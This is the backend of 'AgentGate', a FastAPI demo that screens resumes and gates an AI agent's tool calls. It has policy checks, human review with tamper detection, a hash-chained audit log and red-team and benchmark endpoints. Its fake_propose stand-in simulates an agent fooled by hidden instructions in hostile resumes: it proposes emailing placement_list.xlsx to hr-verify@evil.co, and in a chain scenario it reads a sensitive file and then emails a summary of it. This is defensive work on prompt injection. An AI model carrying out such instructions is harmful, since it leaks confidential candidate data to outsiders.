"""AgentGate FastAPI app. Routes stay thin; logic lives in the other backend modules.

Path: doc -> text -> agent proposes -> gate.check (one RunContext per run, so the sequence is judged
together) -> mock tool (only on ALLOW) -> hash-chained audit log. REVIEW calls wait in a queue; an
approval is bound to the exact call the reviewer saw (R11).
"""

import json
import copy
import logging
import os
import sqlite3
import time
from contextlib import asynccontextmanager
from pathlib import Path

from dotenv import load_dotenv
from fastapi import Body, Depends, FastAPI, File, HTTPException, Request, Response, UploadFile
from fastapi.exceptions import RequestValidationError
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

from backend import auth, db, gate, insights, tools
from backend.schemas import (
    CallExtras,
    ChangePasswordRequest,
    CheckRequest,
    DeleteAccountRequest,
    Decision,
    DomainRequest,
    EmailDraftRequest,
    InjectRequest,
    LoginRequest,
    LogEntry,
    PasswordResetConfirmRequest,
    PasswordResetRequest,
    ProfileUpdateRequest,
    RedTeamRequest,
    ReviewDecision,
    ResumeScreening,
    RunRequest,
    RunResult,
    SignupRequest,
    ToolCall,
)

load_dotenv()
log = logging.getLogger("agentgate")

ROOT = Path(__file__).resolve().parents[1]
DATA = ROOT / "data"
DOC_FOLDERS = ("clean", "hostile")
DOC_TYPES = (".txt", ".pdf", ".docx")
NOT_EXECUTED = "(not executed)"
INJECT_DOC = "(injected)"
# AGENT_STEPS=1 (default): one-shot propose, demo-safe. AGENT_STEPS=3: multi-step loop (issue #8).
DEFAULT_AGENT_STEPS = 1

POLICY = gate.load_policy()


def _agent_steps() -> int:
    raw = os.getenv("AGENT_STEPS", str(DEFAULT_AGENT_STEPS)).strip()
    try:
        return max(1, min(int(raw), int(POLICY.get("global", {}).get("max_calls_per_run", 3))))
    except ValueError:
        return DEFAULT_AGENT_STEPS


@asynccontextmanager
async def lifespan(_: FastAPI):
    db.init_db()
    _ensure_demo_account()
    yield


def _ensure_demo_account() -> None:
    """Hosted demo: the free host wipes the database on each deploy, so recreate one sign-in from env vars."""
    email, password = os.getenv("DEMO_EMAIL", "").strip().casefold(), os.getenv("DEMO_PASSWORD", "")
    if not email or len(password) < 12 or db.get_user_by_email(email):
        return
    db.create_user(os.getenv("DEMO_NAME", "Demo Judge"), email, auth.hash_password(password))
    log.info("demo account %s created", email)


app = FastAPI(title="AgentGate", version="0.1.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=auth.allowed_origins(),
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)



@app.middleware("http")
async def require_trusted_origin(request: Request, call_next):
    if request.url.path.startswith("/api/") and request.method in {"POST", "PUT", "PATCH", "DELETE"}:
        origin = request.headers.get("origin", "").rstrip("/")
        if not origin or origin not in auth.allowed_origins():
            return JSONResponse(status_code=403, content={"detail": "Request origin is not allowed."})
    return await call_next(request)


@app.exception_handler(RequestValidationError)
async def safe_validation_error(_: Request, exc: RequestValidationError):
    errors = [
        {"loc": error.get("loc", [])[-1:], "msg": error.get("msg", "Invalid value.")}
        for error in exc.errors()
    ]
    return JSONResponse(status_code=422, content={"detail": "Please check the submitted fields.", "errors": errors})


@app.exception_handler(Exception)
async def safe_internal_error(_: Request, exc: Exception):
    log.error("Unhandled request error: %s", type(exc).__name__)
    return JSONResponse(status_code=500, content={"detail": "Something went wrong. Please try again."})


def _not_yet(feature: str) -> HTTPException:
    return HTTPException(status_code=501, detail=f"{feature} not implemented yet")


def _resolve_doc(doc: str, workspace_id: int = 1) -> Path:
    """Only files directly inside data/clean or data/hostile; no traversal, no other folders."""
    if doc.startswith("uploads/"):
        from backend import uploads

        try:
            return uploads.resolve_upload(doc, workspace_id)
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        except FileNotFoundError as exc:
            raise HTTPException(status_code=404, detail="Uploaded document not found.") from exc

    path = (DATA / doc).resolve()
    if path.parent not in {(DATA / f).resolve() for f in DOC_FOLDERS} or path.suffix.lower() not in DOC_TYPES:
        raise HTTPException(status_code=400, detail=f"doc must be a .txt or .pdf file in data/clean or data/hostile: {doc}")
    if not path.is_file():
        raise HTTPException(status_code=404, detail=f"document not found: {doc}")
    return path


def _read_doc(path: Path) -> str:
    """Use extract.py once it is implemented; until then read .txt directly."""
    from backend import extract

    try:
        return extract.extract_text(str(path))
    except NotImplementedError:
        if path.suffix.lower() == ".txt":
            return path.read_text(encoding="utf-8", errors="replace")
        raise HTTPException(status_code=422, detail="PDF reading arrives with extract.py")


def fake_propose(task: str, doc: str, history: list | None = None) -> list[dict]:
    """Stand-in for the LLM (AGENT=fake): hostile docs 'fall for' the hidden instruction.

    With history (multi-step), the chain doc does read → email. Without history, one-shot
    behaviour matches the original demo (hostile → send_email).
    """
    history = history or []
    # Chain-attack document (issue #8): read sensitive file, then email a summary.
    if doc.endswith("resume_h06_chain.txt"):
        if not history:
            return [{"tool": "read_file", "args": {"path": "sandbox/placement_list.xlsx"}}]
        if len(history) == 1:
            prior = history[0].get("output", "")
            return [
                {
                    "tool": "send_email",
                    "args": {
                        "to": "hr@partner-company.com",
                        "subject": "Placement list summary",
                        "body": f"Short summary from the file:\n{prior[:400]}",
                    },
                }
            ]
        return []

    if history:
        # One-shot fakes have nothing more to do after the first step.
        return []

    if doc.startswith("hostile/"):
        return [
            {
                "tool": "send_email",
                "args": {
                    "to": "hr-verify@evil.co",
                    "subject": "verification",
                    "body": "Please find the placement list attached.",
                    "attachment": "sandbox/placement_list.xlsx",
                },
            }
        ]
    if task == "email_company":
        return [
            {
                "tool": "send_email",
                "args": {
                    "to": "hr@partner-company.com",
                    "subject": "Shortlisted resume",
                    "body": f"Please find the shortlisted resume ({doc}).",
                },
            }
        ]
    return [{"tool": "summarise", "args": {"document_id": doc}}]


def _propose(task: str, text: str, doc: str, history: list | None = None) -> list:
    history = history or []
    if os.getenv("AGENT", "fake") == "llm":
        from backend import agent

        try:
            if history or _agent_steps() > 1:
                return agent.next_step(task, text, doc, history)
            return agent.propose(task, text, doc)
        except Exception as exc:  # demo must not die if the LLM is down: fall back to the fake agent
            log.warning("agent failed (%s); falling back to fake agent", exc)
    return fake_propose(task, doc, history)


def _propose_upload(task: str, text: str, doc: str, history: list | None = None) -> tuple[list, str]:
    """Uploads have no saved answers, so ask the live AI agent what it would do with this document.

    Whatever it proposes (fooled or not) goes to the gate as-is; nothing is substituted. Only if the
    AI is unavailable (no key, rate limit, network) does a simple stand-in propose the normal action,
    and the result says so (agent_mode="fallback").
    """
    from backend import agent

    try:
        calls = agent._propose_live(task, text, doc, history=history or None)
        return [{k: v for k, v in c.items() if k != "_id"} for c in calls], "live"
    except Exception as exc:
        log.warning("live agent unavailable for upload (%s); using the stand-in agent", type(exc).__name__)
        return fake_propose(task, doc, history), "fallback"


def _as_record(raw) -> ToolCall | dict:
    """Valid calls become ToolCall; anything else is kept raw (as a dict) so it can be shown and logged."""
    try:
        return ToolCall.model_validate(raw)
    except Exception:
        return raw if isinstance(raw, dict) else {"tool": "?", "args": {"_raw": str(raw)}}


def _client_ip(request: Request) -> str:
    """Visitor IP for rate limits. Behind a proxy (Vercel -> Render) every request comes from the proxy,
    so with TRUST_PROXY=true the first X-Forwarded-For address is used instead."""
    if os.getenv("TRUST_PROXY", "").casefold() in {"1", "true", "yes"}:
        forwarded = request.headers.get("x-forwarded-for", "").split(",")[0].strip()
        if forwarded:
            return forwarded
    return request.client.host if request.client else "unknown"


def _enforce_limit(key: str, limit: int, window_seconds: int) -> None:
    allowed, retry_after = db.consume_rate_limit(key, limit, window_seconds)
    if not allowed:
        raise HTTPException(
            status_code=429,
            detail="Too many attempts. Please wait before trying again.",
            headers={"Retry-After": str(retry_after)},
        )


@app.get("/api/auth/config")
def get_auth_config() -> dict:
    return {"password_reset_enabled": auth.password_reset_enabled()}


@app.get("/api/auth/session")
def get_auth_session(request: Request, response: Response) -> dict:
    try:
        session = auth.current_session(request)
    except HTTPException as exc:
        if exc.status_code != 401:
            raise
        auth.clear_session_cookie(response)
        return {"user": None, "csrf_token": None, "password_reset_enabled": auth.password_reset_enabled()}
    return {
        "user": auth.public_user(session),
        "csrf_token": session["csrf_token"],
        "password_reset_enabled": auth.password_reset_enabled(),
    }


@app.post("/api/auth/signup", status_code=201)
def signup(body: SignupRequest, request: Request, response: Response) -> dict:
    _enforce_limit(auth.rate_limit_key("signup-ip", _client_ip(request)), 8, 3600)
    try:
        user = db.create_user(body.full_name, body.email, auth.hash_password(body.password))
    except sqlite3.IntegrityError as exc:
        raise HTTPException(status_code=409, detail="An account with this email already exists.") from exc
    csrf_token, _ = auth.create_session(response, user["id"])
    return {"user": auth.public_user(user), "csrf_token": csrf_token}


@app.post("/api/auth/login")
def login(body: LoginRequest, request: Request, response: Response) -> dict:
    ip = _client_ip(request)
    _enforce_limit(auth.rate_limit_key("login-ip", ip), 20, 900)
    _enforce_limit(auth.rate_limit_key("login-email", body.email), 8, 900)
    account = db.get_user_by_email(body.email)
    encoded_hash = account["password_hash"] if account else None
    if not auth.verify_password(body.password, encoded_hash):
        raise HTTPException(status_code=401, detail="Email or password is incorrect.")
    csrf_token, _ = auth.create_session(response, account["id"])
    return {"user": auth.public_user(account), "csrf_token": csrf_token}


@app.post("/api/auth/logout")
def logout(request: Request, response: Response, _: dict = Depends(auth.require_write_user)) -> dict:
    token = request.cookies.get(auth.COOKIE_NAME)
    if token:
        db.delete_session(auth.token_hash(token))
    auth.clear_session_cookie(response)
    return {"ok": True}


@app.get("/api/auth/profile")
def get_profile(session: dict = Depends(auth.require_user)) -> dict:
    return auth.public_user(db.get_user(session["id"]))


@app.patch("/api/auth/profile")
def update_profile(body: ProfileUpdateRequest, session: dict = Depends(auth.require_write_user)) -> dict:
    return auth.public_user(db.update_user_name(session["id"], body.full_name))


@app.post("/api/auth/change-password")
def change_password(
    body: ChangePasswordRequest,
    response: Response,
    session: dict = Depends(auth.require_write_user),
) -> dict:
    user = db.get_user_by_email(session["email"])
    if not user or not auth.verify_password(body.current_password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Current password is incorrect.")
    if auth.verify_password(body.new_password, user["password_hash"]):
        raise HTTPException(status_code=422, detail="Choose a password you have not used before.")
    db.update_password_hash(session["id"], auth.hash_password(body.new_password))
    csrf_token, _ = auth.create_session(response, session["id"])
    return {"ok": True, "csrf_token": csrf_token}


@app.delete("/api/auth/account")
def delete_account(
    body: DeleteAccountRequest,
    response: Response,
    session: dict = Depends(auth.require_write_user),
) -> dict:
    user = db.get_user_by_email(session["email"])
    if not user or not auth.verify_password(body.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Password is incorrect.")
    db.delete_account(session["id"], session["workspace_id"])
    auth.clear_session_cookie(response)
    return {"ok": True}


@app.post("/api/auth/password-reset")
def request_password_reset(body: PasswordResetRequest, request: Request) -> JSONResponse:
    if not auth.password_reset_enabled():
        raise HTTPException(status_code=503, detail="Password reset email is not configured.")
    ip = _client_ip(request)
    _enforce_limit(auth.rate_limit_key("reset-ip", ip), 10, 3600)
    _enforce_limit(auth.rate_limit_key("reset-email", body.email), 3, 3600)
    account = db.get_user_by_email(body.email)
    if account:
        token, _ = auth.new_reset_token(account["id"])
        try:
            auth.send_password_reset_email(body.email, token)
        except Exception:
            db.delete_password_reset_tokens(account["id"])
            log.warning("Password reset email could not be delivered.")
    return JSONResponse(
        status_code=202,
        content={"message": "If an account exists for this address, reset instructions will be sent."},
    )


@app.post("/api/auth/password-reset/confirm")
def confirm_password_reset(body: PasswordResetConfirmRequest) -> dict:
    if not auth.password_reset_enabled():
        raise HTTPException(status_code=503, detail="Password reset email is not configured.")
    if not auth.consume_reset_token(body.token, body.new_password):
        raise HTTPException(status_code=400, detail="This reset link is invalid or has expired.")
    return {"ok": True}


@app.get("/api/health")
def health() -> dict:
    return {"status": "ok"}


@app.get("/api/docs")
def list_docs(_: dict = Depends(auth.require_user)) -> list[str]:
    return sorted(
        f"{folder}/{p.name}"
        for folder in DOC_FOLDERS
        for p in (DATA / folder).glob("*")
        if p.suffix.lower() in DOC_TYPES
    )


@app.get("/api/uploads")
def list_uploads(session: dict = Depends(auth.require_user)) -> list[dict]:
    from backend import uploads

    return uploads.list_uploads(session["workspace_id"])


@app.post("/api/uploads", status_code=201)
async def upload_resume(
    file: UploadFile = File(...),
    session: dict = Depends(auth.require_write_user),
) -> dict:
    from backend import uploads

    content = await file.read(uploads.MAX_UPLOAD_BYTES + 1)
    await file.close()
    if len(content) > uploads.MAX_UPLOAD_BYTES:
        raise HTTPException(status_code=413, detail="Files must be 10 MB or smaller.")
    try:
        return uploads.save_upload(file.filename or "", content, session["workspace_id"])
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc


def _review_timeout_min() -> float:
    return float(os.getenv("REVIEW_TIMEOUT_MIN", "10"))


def _process_one(
    task: str,
    doc: str,
    raw,
    source: str,
    ctx: gate.RunContext,
    workspace_id: int = 1,
    summary_override: str | None = None,
    policy: dict | None = None,
) -> tuple:
    """Gate one proposed call, maybe execute it, log it, update RunContext."""
    policy = policy or POLICY
    record = _as_record(raw)
    decision = gate.check(raw, task, policy, ctx)
    executed = False
    output = NOT_EXECUTED
    if decision.verdict == "ALLOW":  # the ONLY path to a tool
        token = tools.CURRENT_WORKSPACE.set(workspace_id)
        try:
            output = tools.execute(record, summary_override=summary_override)
            executed = True
        except Exception as exc:
            output = f"Tool error: {exc}"
        finally:
            tools.CURRENT_WORKSPACE.reset(token)
    audit_id = db.save(task, doc, record, decision, executed, source, workspace_id)
    if executed and isinstance(record, ToolCall) and record.tool == "send_email":
        db.add_outbox(record, audit_id, workspace_id)
    if decision.verdict == "REVIEW":
        review_id = db.add_review(audit_id, task, doc, record, _review_timeout_min(), workspace_id)
        output = f"(waiting for human review #{review_id})"
    ctx.record(record, decision, output, policy)
    return record, decision, output


def _process(
    task: str,
    doc: str,
    raw_calls: list,
    source: str,
    text: str = "",
    workspace_id: int = 1,
    hidden_text: str | None = None,
    screening: ResumeScreening | None = None,
    summary_override: str | None = None,
    policy: dict | None = None,
) -> RunResult:
    """Judge every proposed call in order with one shared RunContext; run tools only on ALLOW."""
    policy = policy or POLICY
    ctx = gate.RunContext()
    proposed, decisions, outputs, extras = [], [], [], []
    hidden = hidden_text if hidden_text is not None else insights.hidden_instructions(text)
    for raw in raw_calls:
        record, decision, output = _process_one(
            task, doc, raw, source, ctx, workspace_id, summary_override, policy
        )
        proposed.append(record)
        decisions.append(decision)
        outputs.append(output)
        extras.append(CallExtras(hidden_text=hidden, egress=insights.egress_preview(record, policy)))
    return RunResult(
        proposed=proposed,
        decisions=decisions,
        outputs=outputs,
        extras=extras,
        screening=screening,
    )


@app.post("/api/run")
def run_task(req: RunRequest, session: dict = Depends(auth.require_write_user)) -> RunResult:
    from backend import extract, screening as resume_screening

    workspace_id = session["workspace_id"]
    analysis = extract.analyze_document(_resolve_doc(req.doc, workspace_id))
    text = analysis.text
    hidden_findings = list(analysis.hidden_findings)
    instruction_text = insights.hidden_instructions(text)
    if instruction_text:
        hidden_findings.append(f"Instruction-like text: {instruction_text[:500]}")
    metadata_instructions = insights.hidden_instructions(analysis.metadata_text)
    if metadata_instructions:
        hidden_findings.append(f"Instruction-like document metadata: {metadata_instructions[:500]}")
    hidden_findings = list(dict.fromkeys(hidden_findings))
    hidden_text = "\n".join(hidden_findings) or None
    report = (
        resume_screening.screen_resume(text, hidden_findings)
        if req.task == "summarise_resume"
        else None
    )
    summary_override = f"Summary: {report.summary}" if report else None
    steps = _agent_steps()

    if steps == 1:
        # Demo-safe default: one-shot propose (same shape as before issue #8).
        agent_mode = None
        if req.doc.startswith("uploads/"):
            raw_calls, agent_mode = _propose_upload(req.task, text, req.doc)
        else:
            raw_calls = _propose(req.task, text, req.doc)
        result = _process(
            req.task,
            req.doc,
            raw_calls,
            "run",
            text=text,
            workspace_id=workspace_id,
            hidden_text=hidden_text,
            screening=report,
            summary_override=summary_override,
            policy=workspace_policy(workspace_id),
        )
        result.agent_mode = agent_mode
        return result

    # Multi-step: agent sees prior outputs; stop when it proposes nothing or hits the step cap.
    ctx = gate.RunContext()
    proposed, decisions, outputs, extras = [], [], [], []
    hidden = hidden_text
    history: list[dict] = []
    agent_mode = None
    for _ in range(steps):
        if req.doc.startswith("uploads/"):
            batch, agent_mode = _propose_upload(req.task, text, req.doc, history)
        else:
            batch = _propose(req.task, text, req.doc, history)
        if not batch:
            break
        # One tool call per step keeps the chain readable (read → email).
        raw = batch[0]
        record, decision, output = _process_one(
            req.task,
            req.doc,
            raw,
            "run",
            ctx,
            workspace_id,
            summary_override,
            workspace_policy(workspace_id),
        )
        proposed.append(record)
        decisions.append(decision)
        outputs.append(output)
        extras.append(CallExtras(hidden_text=hidden, egress=insights.egress_preview(record, workspace_policy(workspace_id))))
        call_dict = (
            {"tool": record.tool, "args": record.args}
            if isinstance(record, ToolCall)
            else (raw if isinstance(raw, dict) else {})
        )
        history.append({"call": call_dict, "output": output, "verdict": decision.verdict})

    return RunResult(
        proposed=proposed,
        decisions=decisions,
        outputs=outputs,
        extras=extras,
        screening=report,
        agent_mode=agent_mode,
    )


@app.post("/api/inject")
def inject_calls(req: InjectRequest, session: dict = Depends(auth.require_write_user)) -> RunResult:
    """Raw tool calls straight to the gate (no LLM), through exactly the same path as /api/run."""
    workspace_id = session["workspace_id"]
    return _process(req.task, INJECT_DOC, req.calls, "inject", workspace_id=workspace_id,
                    policy=workspace_policy(workspace_id))


@app.get("/api/logs")
def get_logs(session: dict = Depends(auth.require_user)) -> list[LogEntry]:
    return db.list_logs(workspace_id=session["workspace_id"])


@app.get("/api/logs/verify")
def verify_logs(session: dict = Depends(auth.require_user)) -> dict:
    return db.verify_chain(session["workspace_id"])


def _expire_reviews(workspace_id: int) -> None:
    """Fail closed: a review nobody decided in time is denied, and that is logged."""
    now = time.time()
    for item in db.list_reviews(workspace_id, "pending"):
        if item["expires_at"] <= now:
            db.set_review_status(item["id"], "expired", workspace_id)
            decision = Decision(verdict="BLOCK", rules=["REVIEW_TIMEOUT"],
                                reasons=[f"review #{item['id']} expired; auto-denied"])
            db.save(item["task"], item["doc"], item["call"], decision, False, "timeout", workspace_id)


@app.get("/api/review")
def get_review_queue(session: dict = Depends(auth.require_user)) -> list[dict]:
    workspace_id = session["workspace_id"]
    _expire_reviews(workspace_id)
    return db.list_reviews(workspace_id, "pending")


def _approval_tampered(item: dict, seen_hash: str | None, workspace_id: int) -> str | None:
    """R11: is the call about to run exactly the call that went to review and that the human approved?"""
    stored = db.call_hash(item["task"], item["call"])
    logged = db.get_log(item["audit_id"], workspace_id)
    if stored != item["call_hash"]:
        return "the queued call was changed after it was sent for review"
    if logged is None or db.call_hash(item["task"], {"tool": logged["tool"], "args": logged["args"]}) != item["call_hash"]:
        return "the queued call no longer matches the audit log entry it came from"
    if not db.verify_chain(workspace_id)["ok"]:
        return "the audit log chain is broken, so the approval can't be trusted"
    if seen_hash is not None and seen_hash != item["call_hash"]:
        return "the approval was given for a different call than the one queued"
    return None


@app.post("/api/review/{review_id}")
def decide_review(
    review_id: int,
    body: ReviewDecision,
    session: dict = Depends(auth.require_write_user),
) -> dict:
    workspace_id = session["workspace_id"]
    _expire_reviews(workspace_id)
    item = db.get_review(review_id, workspace_id)
    if item is None:
        raise HTTPException(status_code=404, detail=f"review #{review_id} not found")
    if item["status"] != "pending":
        raise HTTPException(status_code=409, detail=f"review #{review_id} is already {item['status']}")

    call = _as_record(item["call"])
    if body.action == "deny":
        db.set_review_status(review_id, "denied", workspace_id)
        decision = Decision(verdict="BLOCK", rules=["HUMAN_DENIED"], reasons=[f"review #{review_id} denied by reviewer"])
    elif problem := _approval_tampered(item, body.call_hash, workspace_id):
        db.set_review_status(review_id, "tampered", workspace_id)
        decision = Decision(verdict="BLOCK", rules=["R11_APPROVAL_TAMPERED"], reasons=[problem])
    else:
        db.set_review_status(review_id, "approved", workspace_id)
        decision = Decision(verdict="ALLOW", rules=["HUMAN_APPROVED"],
                            reasons=[f"review #{review_id} approved by reviewer"])

    output, executed = NOT_EXECUTED, False
    if decision.verdict == "ALLOW":
        output, executed = tools.execute(call), True
    audit_id = db.save(item["task"], item["doc"], call, decision, executed, "review", workspace_id)
    if executed and call.tool == "send_email":
        db.add_outbox(call, audit_id, workspace_id)
    return {"id": review_id, "decision": decision.model_dump(), "output": output, "audit_id": audit_id}


@app.post("/api/bench")
def run_bench(
    body: dict | None = Body(default=None),
    _: dict = Depends(auth.require_write_user),
) -> dict:
    """Score data/bench_cases.yaml when present (#7). Empty list → zeroed totals until #7 lands.

    Optional body: {"dataset": "default"|"eval"} — eval uses data/eval/cases.yaml.
    """
    from backend import bench

    dataset = "default"
    if isinstance(body, dict) and body.get("dataset") in ("default", "eval"):
        dataset = str(body["dataset"])
    return bench.run_bench(dataset=dataset)


@app.get("/api/bench/latest")
def bench_latest(
    dataset: str = "eval",
    mode: str | None = None,
    _: dict = Depends(auth.require_user),
) -> dict:
    """Return the newest eval results JSON from data/eval/results/ (no re-run); mode=replay|live filters."""
    from backend import bench

    data = bench.latest_eval_result(dataset=dataset, mode=mode)
    if data is None:
        raise HTTPException(status_code=404, detail="no eval results yet")
    return data


@app.post("/api/redteam")
def run_redteam(
    req: RedTeamRequest = Body(default_factory=RedTeamRequest),
    _: dict = Depends(auth.require_write_user),
) -> dict:
    """Invent N hostile docs (or re-score the saved batch) and run them through the bench (#10).

    Body is optional — missing/empty JSON uses RedTeamRequest defaults (n=10, generate+score).
    """
    from backend import redteam

    try:
        return redteam.run(n=req.n, score_only=req.score_only, use_templates=req.templates)
    except FileNotFoundError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except RuntimeError as exc:
        log.warning("Red-team provider request failed (%s).", type(exc).__name__)
        raise HTTPException(
            status_code=503,
            detail="The AI provider is unavailable. Check the server configuration and try again.",
        ) from exc


@app.get("/api/policy")
def get_policy(session: dict = Depends(auth.require_user)) -> dict:
    return {k: v for k, v in workspace_policy(session["workspace_id"]).items() if not k.startswith("_")}


@app.get("/api/outbox")
def get_outbox(session: dict = Depends(auth.require_user)) -> list[dict]:
    return db.list_outbox(session["workspace_id"])


@app.get("/api/tests/latest")
def tests_latest(_: dict = Depends(auth.require_user)) -> dict:
    """Read-only: newest hand-written / suite report from scripts/test_report.py."""
    path = Path(__file__).resolve().parents[1] / "data" / "eval" / "results" / "tests.json"
    if not path.is_file():
        raise HTTPException(status_code=404, detail="no test report yet; run python scripts/test_report.py")
    return json.loads(path.read_text(encoding="utf-8"))


@app.get("/api/tests/manual")
def tests_manual(_: dict = Depends(auth.require_user)) -> list[dict]:
    """Read-only: manual UI test matrix rows from tests/manual/test_matrix.csv."""
    import csv

    path = Path(__file__).resolve().parents[1] / "tests" / "manual" / "test_matrix.csv"
    if not path.is_file():
        raise HTTPException(status_code=404, detail="manual test matrix missing")
    with path.open(encoding="utf-8", newline="") as f:
        return list(csv.DictReader(f))


# --- Email company: draft -> preview -> send (send = /api/inject, the normal gate path) -----------

EMAIL_TASK = "email_company"


def workspace_policy(workspace_id: int) -> dict:
    """policy.yaml plus this workspace's company domains. The global POLICY is never mutated."""
    extra = db.list_domains(workspace_id)
    if not extra:
        return POLICY
    policy = copy.deepcopy(POLICY)
    recipients = policy.setdefault("tasks", {}).setdefault(EMAIL_TASK, {}).setdefault("recipients", {})
    for row in extra:
        key = "allow_domains" if row["kind"] == "allow" else "review_domains"
        domains = recipients.setdefault(key, [])
        if row["domain"] not in domains:
            domains.append(row["domain"])
    return policy


def _template_draft(text: str, doc: str, to: str, note: str | None) -> dict:
    """Stand-in draft when the AI is unavailable: a plain, honest template."""
    name = next((ln.strip() for ln in text.splitlines() if ln.strip()), "the candidate")[:80]
    body = f"Dear Hiring Team,\n\nPlease find attached the profile of {name}."
    if note:
        body += f" {note.strip()}"
    body += "\n\nBest regards,\nPlacement Cell"
    return {"tool": "send_email", "args": {"to": to, "subject": f"Candidate profile: {name}", "body": body, "attachment": doc}}


@app.post("/api/email/draft")
def draft_email(req: EmailDraftRequest, session: dict = Depends(auth.require_write_user)) -> dict:
    """The agent drafts an email about the candidate. Not sent and not logged: the user edits, then sends."""
    from backend import agent

    workspace_id = session["workspace_id"]
    text = _read_doc(_resolve_doc(req.doc, workspace_id))
    request = f"Draft an email to {req.to} about this candidate and attach their document ({req.doc})."
    if req.note:
        request += f" Note from the recruiter: {req.note}"
    try:
        calls = [{k: v for k, v in c.items() if k != "_id"} for c in agent._propose_live(EMAIL_TASK, text, req.doc, request=request)]
        agent_mode = "live"
    except Exception as exc:
        log.warning("live agent unavailable for draft (%s); using a template", type(exc).__name__)
        calls, agent_mode = [], "fallback"
    if not calls:
        calls, agent_mode = [_template_draft(text, req.doc, req.to, req.note)], "fallback"  # AI gave no call
    policy = workspace_policy(workspace_id)
    previews = [gate.check(c, EMAIL_TASK, policy).model_dump() for c in calls]
    return {
        "calls": calls,  # usually one send_email; a fooled agent may propose something else, shown as-is
        "previews": previews,
        "agent_mode": agent_mode,
        "hidden_text": insights.hidden_instructions(text),
    }


@app.post("/api/check")
def check_call(req: CheckRequest, session: dict = Depends(auth.require_write_user)) -> dict:
    """Preview the gate's verdict for one call. Nothing runs and nothing is logged; Send decides for real."""
    return gate.check(req.call, req.task, workspace_policy(session["workspace_id"])).model_dump()


@app.get("/api/allowlist")
def get_allowlist(session: dict = Depends(auth.require_user)) -> dict:
    recipients = POLICY.get("tasks", {}).get(EMAIL_TASK, {}).get("recipients", {})
    return {
        "builtin": {"allow": recipients.get("allow_domains", []), "review": recipients.get("review_domains", [])},
        "workspace": db.list_domains(session["workspace_id"]),
        "inbox_url": mailer_inbox_url(),
    }


def mailer_inbox_url() -> str:
    from backend import mailer

    return mailer.inbox_url()


def _log_policy_change(workspace_id: int, domain: str, kind: str, action: str) -> None:
    """Who changed the allowlist and when goes into the hash-chained audit log."""
    decision = Decision(verdict="ALLOW", rules=["POLICY_CHANGE"], reasons=[f"{action} {domain} ({kind}) in the company allowlist"])
    db.save(EMAIL_TASK, "(allowlist)", {"tool": "policy_change", "args": {"domain": domain, "kind": kind, "action": action}},
            decision, False, "run", workspace_id)


@app.post("/api/allowlist")
def add_allowlist(req: DomainRequest, session: dict = Depends(auth.require_write_user)) -> dict:
    domain = req.domain.lower()
    db.set_domain(session["workspace_id"], domain, req.kind)
    _log_policy_change(session["workspace_id"], domain, req.kind, "added")
    return {"ok": True}


@app.delete("/api/allowlist/{domain}")
def remove_allowlist(domain: str, session: dict = Depends(auth.require_write_user)) -> dict:
    domain = domain.lower()
    if not db.remove_domain(session["workspace_id"], domain):
        raise HTTPException(status_code=404, detail=f"{domain} is not in your allowlist")
    _log_policy_change(session["workspace_id"], domain, "-", "removed")
    return {"ok": True}
